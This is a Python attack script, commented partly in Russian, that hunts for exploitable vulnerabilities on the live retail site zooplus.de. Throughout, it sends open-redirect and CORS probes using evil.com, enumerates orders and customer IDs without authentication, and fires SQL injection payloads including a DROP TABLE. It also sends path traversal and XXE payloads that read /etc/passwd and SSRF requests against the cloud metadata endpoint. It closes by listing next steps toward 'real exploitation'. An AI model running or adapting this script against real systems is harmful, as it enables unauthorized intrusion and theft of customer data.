#!/usr/bin/env python3
"""
Поиск РЕАЛЬНЫХ уязвимостей с impact на Zooplus
Фокус на эксплуатируемые баги, не defense-in-depth
"""

import requests
import json

BASE_URL = "https://www.zooplus.de"

print("="*80)
print("HUNTING FOR REAL VULNERABILITIES")
print("="*80)

# ATTACK 1: Open Redirect
print("\n[*] ATTACK 1: Open Redirect (Account Takeover Chain)")
print("-"*80)

test_urls = [
    f"{BASE_URL}/redirect?url=https://evil.com",
    f"{BASE_URL}/?redirect=https://evil.com",
    f"{BASE_URL}/login?return_url=https://evil.com",
    f"{BASE_URL}/logout?redirect=//evil.com",
    f"{BASE_URL}/account/login?next=https://evil.com",
]

for url in test_urls:
    try:
        resp = requests.get(url, allow_redirects=False, timeout=5)
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            if 'evil.com' in location:
                print(f"[!!!] OPEN REDIRECT FOUND!")
                print(f"URL: {url}")
                print(f"Redirects to: {location}")
                print("[!!!] IMPACT: Phishing, OAuth token theft")
                print("[!!!] SEVERITY: MEDIUM")
                break
    except:
        pass

# ATTACK 2: CORS Misconfiguration
print("\n[*] ATTACK 2: CORS Misconfiguration")
print("-"*80)

api_endpoints = [
    f"{BASE_URL}/api/customer/profile",
    f"{BASE_URL}/api/orders",
    f"{BASE_URL}/myaccount/api/customer-config/v1/customerconfiguration",
]

for endpoint in api_endpoints:
    try:
        headers = {'Origin': 'https://evil.com'}
        resp = requests.get(endpoint, headers=headers, timeout=5)
        
        acao = resp.headers.get('Access-Control-Allow-Origin')
        if acao == '*' or acao == 'https://evil.com':
            print(f"[!!!] CORS MISCONFIGURATION!")
            print(f"Endpoint: {endpoint}")
            print(f"ACAO: {acao}")
            print("[!!!] IMPACT: Data theft from authenticated users")
            print("[!!!] SEVERITY: HIGH")
    except:
        pass

# ATTACK 3: API Enumeration без auth
print("\n[*] ATTACK 3: Unauthenticated API Access")
print("-"*80)

# Try to enumerate orders/users without auth
for i in range(1, 20):
    try:
        resp = requests.get(f"{BASE_URL}/api/orders/{i}", timeout=3)
        if resp.status_code == 200:
            print(f"[!!!] Order {i} accessible without auth!")
            print(f"[!!!] IMPACT: Information disclosure")
    except:
        pass

# Try UUID enumeration
test_uuids = [
    "00000000-0000-0000-0000-000000000001",
    "11111111-1111-1111-1111-111111111111",
]

for uuid in test_uuids:
    try:
        resp = requests.get(f"{BASE_URL}/api/customer/{uuid}", timeout=3)
        if resp.status_code == 200 and len(resp.text) > 100:
            print(f"[!!!] Customer data accessible: {uuid}")
            print(f"Data length: {len(resp.text)}")
    except:
        pass

# ATTACK 4: SQL Injection in Search
print("\n[*] ATTACK 4: SQL Injection in Search")
print("-"*80)

sql_payloads = [
    "test' OR '1'='1",
    "test'; DROP TABLE users--",
    "test' UNION SELECT NULL--",
]

for payload in sql_payloads:
    try:
        resp = requests.get(f"{BASE_URL}/search?q={payload}", timeout=5)
        
        # Check for SQL errors
        sql_errors = ['sql', 'mysql', 'postgresql', 'syntax error', 'unexpected']
        for error in sql_errors:
            if error in resp.text.lower():
                print(f"[!!!] POSSIBLE SQL INJECTION!")
                print(f"Payload: {payload}")
                print(f"Error found: {error}")
                print("[!!!] SEVERITY: CRITICAL")
                break
    except:
        pass

# ATTACK 5: Account Enumeration
print("\n[*] ATTACK 5: Account Enumeration")
print("-"*80)

emails = ["test@example.com", "nonexistent@zzzzzz.com"]

for email in emails:
    try:
        # Password reset
        resp1 = requests.post(
            f"{BASE_URL}/forgot-password",
            json={"email": email},
            timeout=5
        )
        
        # Login
        resp2 = requests.post(
            f"{BASE_URL}/login",
            json={"email": email, "password": "wrongpass"},
            timeout=5
        )
        
        # Different responses = enumeration
        if resp1.status_code != resp2.status_code or resp1.text != resp2.text:
            print(f"[!] Different responses for: {email}")
            print(f"[!] Possible account enumeration")
            print(f"[!] SEVERITY: LOW")
    except:
        pass

# ATTACK 6: Path Traversal / LFI
print("\n[*] ATTACK 6: Path Traversal / LFI")
print("-"*80)

lfi_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
]

endpoints_with_file = [
    f"{BASE_URL}/download?file=",
    f"{BASE_URL}/api/invoice?path=",
    f"{BASE_URL}/static?file=",
]

for endpoint in endpoints_with_file:
    for payload in lfi_payloads:
        try:
            resp = requests.get(f"{endpoint}{payload}", timeout=3)
            if 'root:' in resp.text or '[extensions]' in resp.text:
                print(f"[!!!] LFI FOUND!")
                print(f"URL: {endpoint}{payload}")
                print("[!!!] SEVERITY: CRITICAL")
                print("[!!!] IMPACT: Server file disclosure")
        except:
            pass

# ATTACK 7: SSRF
print("\n[*] ATTACK 7: Server-Side Request Forgery")
print("-"*80)

ssrf_endpoints = [
    f"{BASE_URL}/api/fetch?url=http://169.254.169.254/latest/meta-data/",
    f"{BASE_URL}/proxy?url=http://localhost:8080/admin",
    f"{BASE_URL}/webhook?callback=http://internal-service:3000/",
]

for url in ssrf_endpoints:
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and len(resp.text) > 0:
            print(f"[!] Possible SSRF at: {url}")
            print(f"[!] Response length: {len(resp.text)}")
    except:
        pass

# ATTACK 8: XXE in XML endpoints
print("\n[*] ATTACK 8: XXE (XML External Entity)")
print("-"*80)

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>"""

xml_endpoints = [
    f"{BASE_URL}/api/import",
    f"{BASE_URL}/api/upload",
]

for endpoint in xml_endpoints:
    try:
        resp = requests.post(
            endpoint,
            data=xxe_payload,
            headers={'Content-Type': 'application/xml'},
            timeout=5
        )
        if 'root:' in resp.text:
            print(f"[!!!] XXE VULNERABILITY!")
            print(f"Endpoint: {endpoint}")
            print("[!!!] SEVERITY: CRITICAL")
    except:
        pass

print("\n" + "="*80)
print("SCAN COMPLETE")
print("="*80)
print("\n[*] Automated scan finished")
print("[*] For real exploitation, need:")
print("    1. Valid session tokens for both accounts")
print("    2. Fresh password reset tokens")
print("    3. Manual verification of findings")
print("\n[*] CRITICAL TESTS STILL NEEDED:")
print("    - IDOR with valid tokens")
print("    - CSRF on state-changing actions")
print("    - XSS in authenticated forms")
print("    - Business logic flaws in checkout")

